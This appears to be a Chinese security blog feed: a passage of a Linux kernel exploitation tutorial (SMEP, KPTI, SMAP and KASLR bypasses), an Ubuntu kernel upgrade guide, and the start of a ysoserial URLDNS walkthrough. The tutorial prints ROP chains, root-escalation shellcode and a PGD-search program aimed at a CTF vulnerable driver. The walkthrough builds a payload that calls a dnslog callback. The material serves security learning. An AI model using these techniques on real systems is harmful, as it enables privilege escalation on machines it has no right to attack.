检测KPTI机制是否开启的方法有很多，<code>cat /proc/cpuinfo | grep pti</code>或者类似上面说到的cpu参数<code>-cpu kvm64,smep</code>，或者检查进程页表，但是这需要你可以查看物理内存，通过内核任意读取的原语可以做到，但是需要进行虚拟地址和物理地址之间的转换，这就需要你具备一定的内存管理知识和多级页表相关知识，这些基础知识这里就不细说了，下面举例一些demo看如何获取相关物理地址。</p><pre><code class="c">void *pgd = get_current()-&gt;mm-&gt;pgd;</code></pre><p>get_current() 会帮助获取当前的<code>task_struct</code>，然后得到<code>mm_struct</code>结构体类型的mm成员，所有的进程地址空间都包含该结构体里面，其中pgd字段代表的是全局页目录，拿到地址之后进行页表地址转换就可以拿到对应的物理地址，那么在多级页表的处理过程中可以拿到每一级页表的入口地址，该地址的NX bit就表明该页表是否开启了NX，结论就是，正常情况下每一级页表的NX位是没设置的，但是全局页目录设置了NX bit，因为在多级页表解析的过程中全局页目录是共享的。</p><h3 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h3><p>​        内核里面的rop和用户态其实是非常相似的，做rop最基本的就是先获取到<code>vmlinux</code>，以ctf赛题来说一般提供的都是压缩后的bzImage，这里可以通过<a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a>工具来实现解压缩：</p><pre><code class="shell">./vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</code></pre><p>然后通过ROPgadget或者ropper从vmlinux里面获取gadget</p><pre><code class="shell">ROPgadget --binary vmlinux &gt; gadgets</code></pre><p>gadget的寻找原则其实不是固定的，要看场景丁需求，不过类似<code>mov esp, 0xf7000000 ; ret</code>这样的一般都很不错（注意常量一定要对齐），可以将esp指向我们分配的地址然后接下来的ret操作就容易被控制进而执行rop链。但是ROPgadget是不会检查相关段是否开启了NX的。</p><p>​        对于SMEP来说，它由<code>cr4</code>寄存器控制，因此可以通过改变<code>cr4</code>寄存器的第20 bit的值来进行绕过，比如使用<code>native_write_cr4</code>函数：</p><pre><code class="c">void native_write_cr4(unsigned long val){    unsigned long bits_missing = 0;set_register:    asm volatile("mov %0,%%cr4": "+r" (val), "+m" (cr4_pinned_bits));    if (static_branch_likely(&amp;cr_pinning)) {        if (unlikely((val &amp; cr4_pinned_bits) != cr4_pinned_bits)) {            bits_missing = ~val &amp; cr4_pinned_bits;            val |= bits_missing;            goto set_register;        }        /* Warn after we've set the missing bits. */        WARN_ONCE(bits_missing, "CR4 bits went missing: %lx!?\n",              bits_missing);    }}EXPORT_SYMBOL(native_write_cr4);</code></pre><p>但是从代码里面的警告就可以看出，在较新版本的内核中，该函数已经不能改变第20bit和第21bit的值了，</p><p>​        对于<code>KPTI</code>就比较麻烦了，一种方法是如果具备内核任意读写和当前进程页表的地址，那么就可以直接通过关闭NX bit来实现，但是都任意读写了，直接修改cred结构体可能会更香一点。那么最好的方式其实应该去利用kernel本身的代码来帮助实现这一绕过过程，下面是<a href="https://github.com/torvalds/linux/blob/7ac63f6ba5db5e2e81e4674551d6f9ec58e70618/arch/x86/entry/entry_64.S">kernel entry</a>的部分代码，主要是用于内核态到用户态的切换，这其实很符合exp的需求，原本exp不能成功执行的主要原因就是在返回用户态之后执行的代码所在页其实属于内核，这个切换它成功的进行了页表切换，因接下来用到的就是用户态的页表，。</p><pre><code class="asm">GLOBAL(swapgs_restore_regs_and_return_to_usermode)#ifdef CONFIG_DEBUG_ENTRY    /* Assert that pt_regs indicates user mode. */    testb    $3, CS(%rsp)    jnz    1f    ud21:#endif    POP_REGS pop_rdi=0    /*     * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.     * Save old stack pointer and switch to trampoline stack.     */    movq    %rsp, %rdi    movq    PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp    /* Copy the IRET frame to the trampoline stack. */    pushq    6*8(%rdi)    /* SS */    pushq    5*8(%rdi)    /* RSP */    pushq    4*8(%rdi)    /* EFLAGS */    pushq    3*8(%rdi)    /* CS */    pushq    2*8(%rdi)    /* RIP */    /* Push user RDI on the trampoline stack. */    pushq    (%rdi)    /*     * We are on the trampoline stack.  All regs except RDI are live.     * We can do future final exit work right here.     */    STACKLEAK_ERASE_NOCLOBBER    SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi    /* Restore RDI. */    popq    %rdi    SWAPGS    INTERRUPT_RETURN</code></pre><p>到此，其实就不难理解为什么kernel exp里面很多类似这样的ROP code:</p><pre><code class="c">    pivot_stack[0] = 0xcafedeadbeef;    pivot_stack[i++] = pop_rdi;    pivot_stack[i++] = 0;    pivot_stack[i++] = prepare_kernel_cred;    pivot_stack[i++] = pop_rdx;    pivot_stack[i++] = 8;    pivot_stack[i++] = cmp;    pivot_stack[i++] = mov_rdi_rax;    pivot_stack[i++] = commit_creds;    pivot_stack[i++] = kpti_trampoline;    pivot_stack[i++] = 0x12345678; // RAX    pivot_stack[i++] = 0x87654321; // RDI    pivot_stack[i++] = (unsigned long)u_code; //userspace_rip;    pivot_stack[i++] = 0x33; //userspace_cs;    pivot_stack[i++] = 0x246; //userspace_rflags;    pivot_stack[i++] = (unsigned long)u_stack; //userspace_rsp;    pivot_stack[i++] = 0x2b; //userspace_ss;</code></pre><p>至于最开始的0xcafedeadbeef，这其实是为了触发<code>page fault handler</code>，因此根据linux demand-on-paging的原则，只有触发该handler的情况下才会真正mmaping。</p><p>​        还有一种方法是通过<a href="https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/">signal handler</a>。</p><h3 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h3><p>​        获取root权限的方式在内核里面还算比较统一的，基本很多都是通过</p><ol><li><code>commit_creds(prepare_kernel_cred(0))</code>。</li><li>确定cred structure结构体的地址来进行权限提升。</li><li>ctf里面可能会用到的方法就是通过chmod 修改flag文件为777权限然后挂起，然后通过用户空间的一个进程来读取文件内容。</li></ol><p>​    那么shellcode的写法就比较直接了，假设通过<code>cat /proc/kallsyms</code>得到了<code>grep commit_creds</code>和<code>grep prepare_kernel_cred</code>的地址：</p><pre><code class="asm">xor rdi, rdimov rcx, prepare_kernel_cred_addrcall rcxmov rdi, raxmov rcx, commit_creds_addrcall rcxret</code></pre><p>这种shellcode没有做内核地址空间与用户地址空间的转换，因此可能比较局限，适用于仅仅存在一个<code>retun 0</code>类似指令的目标函数。为了适配更多的场景，需要做内核态和用户态的上下文切换，在linux kernel <a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/entry_64.S">源码</a>中详细介绍了如何进入内核态：</p><blockquote><p>64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,then loads new ss, cs, and rip from previously programmed MSRs.rflags gets masked by a value from another MSR (so CLD and CLACare not needed). SYSCALL does not save anything on the stackand does not change rsp.</p><p>注：<a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a></p></blockquote><p>从内核态返回用户态可以通过Linux提供的一些指令<code>SYSRET</code>，<code>SYSEXIT</code>，<code>IRET</code>，其中SYSRET和IRET可以适用于所有的CPU供应商，并且被包含在<code>x86_64</code>的标准里面，SYSRET需要利用MSR特殊读写指令因而较为麻烦，因此一般采用<code>IRET</code>。该指令的含义就是从中断返回，通过查看AMD64手册可以看出在保护模式下<code>IRET</code>对应<code>IRETQ</code>，那么我们只需要在执行<code>IRETQ</code>之前按顺序放置好RIP, CS, RFLAGS, RSP, SS，最后还需要知道的时候<code>swapgs</code>指令，它的语义是：Exchange GS base with KernelGSBase MSR，在linux syscall entry的代码哪里也存在该指令的调用，因此在通过system call返回用户空间的时候我们需要再做一次<code>swapgs</code>用于恢复GS。</p><pre><code class="asm">swapgspush userspace_sspush userspace_rsppush userspace_rflagspush userspace_cspush userspace_ripiretq</code></pre><p>​        还有一种方法就是上述的第三条，第一步需要先找到chmod func的地址：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320092704328.png" alt="image-20220320092704328"></p><p>可以看到<code>__x64_sys_chmod</code>的地址是<code>0xffffffff872dacf0</code>，在内核调试中对该地址下断点就可以得到该如何给它附加参数：</p><pre><code class="asm">    movzx  edx, word ptr [rdi + 0x68]    mov    rsi, qword ptr [rdi + 0x70]    mov    edi, 0xffffff9c    call   0xffffffff811a1b50</code></pre><p>不过要记得，<code>/flag</code>字符串存放地址应该使用内核空间地址，同时由于Linux kernel本身采用的是<strong>Non-Preemptive Threading Model</strong>，因此在kernel thred的执行过程中一般不会进行上下文切换，除非调用了特殊的API，通过sleep当前thread其实就是一个很好的迫使kernel进行上下文切换的，当然kernel里面的sleep和用户态有很大的差别，需要调用不同的API，这里我选择的是msleep():</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220320101601670.png" alt="image-20220320101601670"></p><p>那么，完整的shellcode就有了：</p><pre><code class="asm">; commit_cred(prepare_kernel_creds(0))xor rdi, rdimov rcx, prepare_kernel_cred_addrcall rcxmov rdi, raxmov rcx, commit_creds_addrcall rcx; chmod 777 flagmov r15, 0x67616c662fmov r14, 0xdeadf00mov [r14], r15mov rdi, 0xffffff9cmov rsi, r14mov rdx, 0777mov rcx, x64_chmod_addrcall rcx; msleep(0x1000000)mov rdi, 0x1000000mov rcx, msleep_addrcall rcxint 3</code></pre><p>然后我们让exp在后台执行，前台执行<code>cat flag</code>实现文件读取。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        在通过ROP编写shellcode的时候要注意两点：</p><ol><li>在exp中的mmap产生的shellcode地址不在之前kernel访问的页表里面，那么在执行的时候就会触发<a href="https://en.wikipedia.org/wiki/Double_fault#:~:text=On%20the%20x86%20architecture%2C%20a,interrupt%20handler%20resides%20is%20invalid.">double fault</a>。</li><li>栈指针必须在向上向下两个方向上都还剩比较宽阔的空间<code>unsigned long *pivot_stack = mmap((void *)0xf7000000-0x1000, 0x1000+0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);</code>，因为Linux kernel func 比如 <code>commit_creds</code>需要使用栈空间并且不能使用低于0xf7000000大小的地址，否则会引起uncatchable page fault，<code>MAP_GROWSDOWN</code>是无效的，因为它只能用于用户态。</li></ol><h2 id="SMEP-PTI-SMAP-KASLR-bypass"><a href="#SMEP-PTI-SMAP-KASLR-bypass" class="headerlink" title="SMEP+PTI+SMAP+KASLR bypass"></a>SMEP+PTI+SMAP+KASLR bypass</h2><blockquote><p>KASLR就不多解释了，就是一个kernel的地址随机化</p></blockquote><h3 id="SMAP"><a href="#SMAP" class="headerlink" title="SMAP"></a>SMAP</h3><p>​        SMAP是<code>Supervisor Mode Access Prevention</code>，它使得用户态的指针无法在内核态被解引用，这无疑会使得ROP难以有效使用。</p><p>​        在qemu里面<code>-cpu kvm64,smep,smap</code>表明开启了SMAP机制，当然<code>cat /proc/cpuinfo | grep smap</code>也可以看出来。</p><h3 id="SMAP-bypass"><a href="#SMAP-bypass" class="headerlink" title="SMAP bypass"></a>SMAP bypass</h3><p>​        通过分析linux kernel的mmap实现其实就可以知道我们可以通过类似linux kernel heap spray的方式将用户空间的代码映射到内核里面，只需要用<strong>MAP_POPULATE</strong>的flag:</p><pre><code>       MAP_POPULATE (since Linux 2.5.46)              Populate (prefault) page tables for a mapping.  For a file mapping, this causes read-ahead on the file.  This will help to reduce blocking on page faults later.  The mmap() call doesn't fail if the mapping cannot be populated (for example, due to limitations on the number of mapped huge pages when using MAP_HUGETLB).  MAP_POPULATE is supported for private mappings only since Linux 2.6.23.</code></pre><p>这是因为在通过该flag进行mmap的时候，物理页也会同时被映射而不是想之前按需映射的方式。下面是一个github提供的demo可以测算可mmap的地址大小：</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;int main (int argc, char **argv){    int cnt = 0;    void *pg;    while(1) {        pg = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);        if (pg == MAP_FAILED) {            perror("mmap");            break;        }        else {            cnt++;            if (cnt % 1000 == 0) {                printf("[*] allocated %d pages, asking for more...\n", cnt);            }        }    }    printf("[*] number of pages allocated: %d\n", cnt);    return 0;}</code></pre><p>通过实验得出结论就是尽管RAM很小，但是最大mmap的值是它的数倍，同时该值会根据内存资源的大小来发生变化。同时物理页的分配有一个特点，<strong>那就是它们一般都是连续分配的</strong>。如此通过大量的mmap地址并填充信息，最终其实是可以在内核里面访问到这些信息的，如此就可以绕过SMAP的保护，因为我们不需要再解析用户态的指针，而是通过内核地址进行代码执行。</p><p>​        那么应该如何获得物理地址呢？通过<a href="https://www.kernel.org/doc/gorman/html/understand/understand006.html">文档</a>发现，在Linux中每一个进程都维护一个指针<code>mm_struct-&gt;pgd</code>指向该进程的**Page Global Directory (PGD)**，表里面包含的是<code>pgd_t</code>数组，pgd_t定义在<code>asm/page.h</code>里面根据不同的架构拥有不同的值，在x86架构下<code>mm_struct-&gt;pgd</code>会被复制到cr3寄存器。</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220321164429738.png" alt="image-20220321164429738"></p><p>​        可以知道通过mmap拿到的是虚拟地址，因此需要做一个虚拟地址到屋里地址之间的转换，那么如何获取cr3或者说pgd的值呢，一方面可以通过内核获取另一方面可以通过<code>/proc/(pid)/pagemap</code>获取，还有一种很奇特的方法即是通过映射64bit的[39:48]形成的地址，这里一共是0xff个地址，此时在物理页表中就会生成大量稠密的地址，这些地址会有一些特征，比如：</p><ol><li>最高位为1。</li><li>最低字节为0x67。</li></ol><p>那么就可以通过遍历内核地址（一般从pageOffsetBase + (0x7c000 &lt;&lt; 12)开始）中的值来判断是否符合自己刚才通过spraying注入的大量地址，如果一个地址的内容符合自己注入的地址，同时索引0x100的结果为0，那么基本就能确定PGD的地址了。</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/stat.h&gt;#include &lt;string.h&gt;#define VULN_READ 0x1111#define VULN_WRITE 0x2222#define VULN_STACK 0x3333#define VULN_PGD 0x4444#define VULN_PB 0x5555#define SPRAY_CNT 0x10000struct rwRequest {    void *kaddr;    void *uaddr;    size_t length;};unsigned long pageOffsetBase = 0xffff888000000000;int Open(char *fname, int mode) {    int fd;    if ((fd = open(fname, mode)) &lt; 0) {        perror("open");        exit(-1);    }    return fd;}void write64(unsigned long kaddr, unsigned long value) {    struct rwRequest req;    unsigned long value_ = value;    req.uaddr = &amp;value_;    req.length = 8;    req.kaddr = (void *)kaddr;    int fd = Open("/dev/vuln", O_RDONLY);    if (ioctl(fd, VULN_WRITE, &amp;req) &lt; 0) {        perror("ioctl");        exit(-1);    }}unsigned long read64(unsigned long kaddr) {    struct rwRequest req;    unsigned long value;;    req.uaddr = &amp;value;    req.length = 8;    req.kaddr = (void *)kaddr;    int fd = Open("/dev/vuln", O_RDONLY);    if (ioctl(fd, VULN_READ, &amp;req) &lt; 0) {        perror("ioctl");        exit(-1);    }    close(fd);    return value;}unsigned long leak_stack() {    struct rwRequest req;    unsigned long stack;    int fd = Open("/dev/vuln", O_RDONLY);    req.uaddr = &amp;stack;    if (ioctl(fd, VULN_STACK, &amp;req) &lt; 0) {        perror("ioctl");        exit(-1);    }    close(fd);    return stack;}unsigned long leak_pgd() {    struct rwRequest req;    unsigned long pgd = 0xcccccccc;    int fd = Open("/dev/vuln", O_RDONLY);    req.uaddr = &amp;pgd;    if (ioctl(fd, VULN_PGD, &amp;req) &lt; 0) {        perror("ioctl");        exit(-1);    }    close(fd);    return pgd;}unsigned long leak_physmap_base() {    struct rwRequest req;    unsigned long pgd = 0xcccccccc;    int fd = Open("/dev/vuln", O_RDONLY);    req.uaddr = &amp;pgd;    if (ioctl(fd, VULN_PB, &amp;req) &lt; 0) {        perror("ioctl");        exit(-1);    }    close(fd);    return pgd;}int check_page(unsigned long addr) {    unsigned long page[0x101];    for (int i = 0; i &lt; 0x101; i++) {        page[i] = read64(addr + i*8);    }    for (int i = 0; i &lt; 0x100; i++) {        if (((page[i] &amp; 0xff) != 0x67) || (!(page[i] &gt;&gt; 63))) {            return 0;        }    }    return page[0x100] == 0;}int main (int argc, char **argv){    void *pg;    unsigned long search_addr;        search_addr = pageOffsetBase + (0x7c000 &lt;&lt; 12);        for (unsigned long i = 1; i &lt; 0x100; i++) {        pg = mmap((void *)(i &lt;&lt; 39), 0x1000, PROT_READ|PROT_WRITE, MAP_POPULATE|MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);        if (pg == MAP_FAILED) {            perror("mmap");            exit(-1);        }    }    printf("[*] starting search from addr %p\n", (void *)search_addr);        while(1) {        if (check_page(search_addr)) {            printf("[+] located the PGD: %p\n", (void *)search_addr);            break;        }        search_addr += 0x1000;    }    printf("[*] this is the actual PGD: %p\n", (void *)leak_pgd());        return 0;}</code></pre><p>​        如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。</p><p>​        如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。</p><h3 id="KASLR-bypass"><a href="#KASLR-bypass" class="headerlink" title="KASLR bypass"></a>KASLR bypass</h3><p>​        KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察<code>/proc/kallsyms</code>的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制<a href="https://lwn.net/Articles/824307/">Function Granular KASLR</a>，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。</p><p>​        但是FG-KASLR并不完善，一些内核区域并不会随机化：</p><ol><li>不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。</li><li>swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。</li><li>内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。</li></ol><p>​        第三个比较感兴趣：</p><pre><code class="c">struct kernel_symbol {      int value_offset;      int name_offset;      int namespace_offset;};</code></pre><p>可以看出<code>value_offset</code>应该是比较有趣的，这个对应的值也可以通过<code>/proc/kallsyms</code>获取：</p><p><img src="https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220323092910382.png" alt="image-20220323092910382"></p><p>因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>​        网上看到一段总结，感觉很不错：</p><ol><li>如果内核没有保护，就直接ret2usr。</li><li>如果开了SMEP，就用ROP</li><li>溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。</li><li>KPTI利用KPTI trampoline或者signal handler</li><li>SMAP会导致stack pivot很难利用</li><li>如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。</li><li>如果有FG-KASLR，记得利用ksymtab和不受影响的区域。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p><p><a href="https://github.com/pr0cf5/kernel-exploit-practice">https://github.com/pr0cf5/kernel-exploit-practice</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-Kernel-保护机制绕过&quot;&gt;&lt;a href=&quot;#Linux-Kernel-保护机制绕过&quot; class=&quot;headerlink&quot; title=&quot;Linux Kernel 保护机制绕过&quot;&gt;&lt;/a&gt;Linux Kernel 保护机制绕过&lt;/h1&gt;&lt;bloc</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://rainsec.cn/categories/Linux-Kernel/"/>
    
    
    <category term="Linux Kernel" scheme="https://rainsec.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 更新内核到指定版本</title>
    <link href="https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html"/>
    <id>https://rainsec.cn/post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</id>
    <published>2022-03-28T10:38:45.000Z</published>
    <updated>2022-07-20T11:37:57.231Z</updated>
    
    <content type="html"><![CDATA[<p>记一次更新内核到5.8.0-33-generic</p><span id="more"></span><h2 id="更新到指定版本"><a href="#更新到指定版本" class="headerlink" title="更新到指定版本"></a>更新到指定版本</h2><h3 id="查看当前版本"><a href="#查看当前版本" class="headerlink" title="查看当前版本"></a>查看当前版本</h3><pre><code class="shell">$ uname -r4.15.0-101-generic$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription:    Ubuntu 20.04 LTSRelease:        20.04Codename:       focal</code></pre><h3 id="查看当前已经安装的-Kernel-Image"><a href="#查看当前已经安装的-Kernel-Image" class="headerlink" title="查看当前已经安装的 Kernel Image"></a>查看当前已经安装的 Kernel Image</h3><pre><code class="shell">$ dpkg --get-selections |grep linux-imagelinux-image-5.4.0-90-generic                    purgelinux-image-5.8.0-33-generic                    installlinux-image-generic                             install</code></pre><h3 id="查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库"><a href="#查询当前软件仓库可以安装的-Kernel-Image-版本，如果没有预期的版本，则需要额外配置仓库" class="headerlink" title="查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库"></a>查询当前软件仓库可以安装的 Kernel Image 版本，如果没有预期的版本，则需要额外配置仓库</h3><pre><code class="shell">$ apt-cache search linux | grep linux-image</code></pre><h3 id="安装指定版本的-Kernel-Image-和-Kernel-Header"><a href="#安装指定版本的-Kernel-Image-和-Kernel-Header" class="headerlink" title="安装指定版本的 Kernel Image 和 Kernel Header"></a>安装指定版本的 Kernel Image 和 Kernel Header</h3><pre><code class="shell">$ sudo apt-get install linux-headers-5.8.0-33-generic linux-image-5.8.0-33-generic</code></pre><h3 id="查看当前的Kernel列表"><a href="#查看当前的Kernel列表" class="headerlink" title="查看当前的Kernel列表"></a>查看当前的Kernel列表</h3><pre><code class="shell">$ grep menuentry /boot/grub/grub.cfgif [ x"${feature_menuentry_id}" = xy ]; then  menuentry_id_option="--id"  menuentry_id_option=""export menuentry_id_optionmenuentry 'Ubuntu' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-simple-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {submenu 'Advanced options for Ubuntu' $menuentry_id_option 'gnulinux-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.8.0-33-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.8.0-33-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.8.0-33-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.4.0-90-generic' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-advanced-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {        menuentry 'Ubuntu, with Linux 5.4.0-90-generic (recovery mode)' --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option 'gnulinux-5.4.0-90-generic-recovery-b986dc3b-6b82-44d5-acb8-6cbad5e357d5' {</code></pre><h3 id="修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置"><a href="#修改-Kernel-的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改-grub-配置" class="headerlink" title="修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置"></a>修改 Kernel 的启动顺序：如果安装的是最新的版本，那么默认就是首选的；如果安装的是旧版本，就需要修改 grub 配置</h3><pre><code class="shell">$ sudo vim /etc/default/grub# GRUB_DEFAULT=0GRUB_DEFAULT="Advanced options for Ubuntu&gt;Ubuntu, with Linux 5.8.0-33-generic"</code></pre><h3 id="生效配置"><a href="#生效配置" class="headerlink" title="生效配置"></a>生效配置</h3><pre><code class="shell">$ update-grub$ reboot</code></pre><h2 id="删除不需要的Kernel"><a href="#删除不需要的Kernel" class="headerlink" title="删除不需要的Kernel"></a>删除不需要的Kernel</h2><h3 id="查询不包括当前内核版本的其它所有内核版本"><a href="#查询不包括当前内核版本的其它所有内核版本" class="headerlink" title="查询不包括当前内核版本的其它所有内核版本"></a>查询不包括当前内核版本的其它所有内核版本</h3><pre><code class="shell">$ dpkg -l | tail -n +6| grep -E 'linux-image-[0-9]+'| grep -Fv $(uname -r)pi  linux-image-5.4.0-90-generic         5.4.0-90.101                      amd64        Signed kernel image generic</code></pre><p>Kernel 状态：</p><ul><li>rc：表示已经被移除</li><li>ii：表示符合移除条件（可移除）</li><li>iU：已进入 apt 安装队列，但还未被安装（不可移除）</li></ul><h3 id="删除指定的Kernel"><a href="#删除指定的Kernel" class="headerlink" title="删除指定的Kernel"></a>删除指定的Kernel</h3><pre><code class="shell">dpkg --purge linux-image-5.4.0-90-generic</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;记一次更新内核到5.8.0-33-generic&lt;/p&gt;</summary>
    
    
    
    <category term="系统运维" scheme="https://rainsec.cn/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="Linux" scheme="https://rainsec.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS调试那些小事</title>
    <link href="https://rainsec.cn/post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html"/>
    <id>https://rainsec.cn/post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html</id>
    <published>2022-03-26T10:48:45.000Z</published>
    <updated>2022-07-22T11:58:12.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS调试那些小事"><a href="#URLDNS调试那些小事" class="headerlink" title="URLDNS调试那些小事"></a>URLDNS调试那些小事</h1><p>近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。</p><h4 id="ysoserial链接："><a href="#ysoserial链接：" class="headerlink" title="ysoserial链接："></a>ysoserial链接：</h4><pre><code class="txt">下载地址: https://github.com/frohoff/ysoserial这里用jdk1.8来编译</code></pre><h4 id="编译ysoserial"><a href="#编译ysoserial" class="headerlink" title="编译ysoserial"></a>编译ysoserial</h4><p>用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。</p><p>下载好后进入GeneratePayload这个类</p><p>进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。</p><p>若运行成功后</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-1.png" alt="image-20220319164133435"></p><p>按下蓝色小闪电，然后package进行编译打包。</p><p>target目录下会显示编译好的jar包。</p><h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>建立maven项目：</p><pre><code class="java">import java.io.FileInputStream;import java.io.ObjectInputStream;public class bug {    public static void main(String[] args) throws Exception {        FileInputStream inputStream = new FileInputStream("poc.ser");        ObjectInputStream oi = new ObjectInputStream(inputStream);        oi.readObject();        oi.close();        System.out.println("反序列化完成");    }}</code></pre><p>ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。</p><p>生成恶意poc：</p><p>在<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p>获得临时域名：0dt3fc.dnslog.cn</p><p> java -jar .\ysoserial-0.0.5-all.jar URLDNS “<a href="http://0dt3fc.dnslog.cn&quot;/">http://0dt3fc.dnslog.cn"</a> &gt; poc.ser</p><p>将poc.ser放在漏洞项目根目录运行即可。</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-2.png" alt="image-20220319165349429"></p><p>注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：<br><a href="https://gitter.im/frohoff/ysoserial/archives/2017/09/18">https://gitter.im/frohoff/ysoserial/archives/2017/09/18</a></p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。</p><p>在URLDNS.java下，作者写了如下利用链：</p><pre><code> *   Gadget Chain: *   